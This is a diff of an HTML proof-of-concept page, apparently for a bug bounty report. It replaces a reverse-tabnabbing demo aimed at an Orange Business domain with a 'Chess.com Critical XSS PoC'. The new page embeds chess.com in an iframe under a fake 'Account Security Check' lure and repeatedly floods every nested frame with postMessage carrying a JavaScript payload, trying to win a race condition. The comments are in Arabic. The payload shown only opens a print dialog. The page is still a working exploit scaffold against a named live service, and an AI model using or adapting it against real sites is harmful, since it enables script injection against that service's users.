@@ -2,39 +2,54 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>PoC: Reverse Tabnabbing</title>
+    <title>Chess.com Critical XSS PoC</title>
     <style>
-        body {
-            background-color: #1a1a1a;
-            color: #fff;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
-            text-align: center;
-        }
-        .container {
-            border: 2px solid #ff4444;
-            padding: 40px;
-            background-color: #2a2a2a;
-            border-radius: 10px;
-            box-shadow: 0 0 20px rgba(255, 68, 68, 0.5);
-            max-width: 600px;
-        }
-        h1 { color: #ff4444; }
-        p { font-size: 1.2em; line-height: 1.6; }
-        .highlight { color: #ffeb3b; font-weight: bold; }
+        body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background-color: #f4f4f4;}
+        iframe { border: 2px solid #333; box-shadow: 0 0 10px rgba(0,0,0,0.5); }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h1>🚨 Proof of Concept 🚨</h1>
-        <h2>Phishing Successful</h2>
-        <p>This tab was originally <span class="highlight">liveobjects.orange-business.com</span>.</p>
-        <p>Due to UI Redressing vulnerability, an attacker was able to redirect this trusted tab to an external domain.</p>
-        <p>In a real-world attack, this page would be a perfect clone of the Orange Login screen designed to harvest administrator credentials.</p>
-    </div>
+    <h1>Chess.com Account Security Check</h1>
+    <p>Please wait while we verify your session...</p>
+    
+    <iframe id="victim_frame" src="https://www.chess.com" width="800" height="600"></iframe>
+
+    <script>
+        // Payload الإثبات البصري (نافذة الطباعة)
+        let payload = "window.print(); // get_ext";
+
+        function blastFrames(win) {
+            try {
+                // إرسال الرسالة لأي Iframe نقابله
+                win.postMessage(payload, "*");
+            } catch(e) {}
+            
+            // الدخول في الأعماق (Recursion)
+            try {
+                for (let i = 0; i < win.frames.length; i++) {
+                    blastFrames(win.frames[i]);
+                }
+            } catch(e) {}
+        }
+
+        // تشغيل الهجوم بعد ما المتصفح يبدأ يحمل الـ Iframe
+        setTimeout(() => {
+            console.log("Starting the blast...");
+            // نضرب كل 10 ملي ثانية عشان نكسب الـ Race Condition
+            let spammer = setInterval(() => {
+                let target = document.getElementById('victim_frame').contentWindow;
+                if(target) {
+                    blastFrames(target);
+                }
+            }, 10);
+
+            // نوقف الضرب بعد 10 ثواني عشان المتصفح ميهنجش
+            setTimeout(() => {
+                clearInterval(spammer);
+                console.log("Blasting finished.");
+            }, 10000);
+
+        }, 3000); // نستنى 3 ثواني الأول عشان الموقع يلحق يفتح
+    </script>
 </body>
 </html>
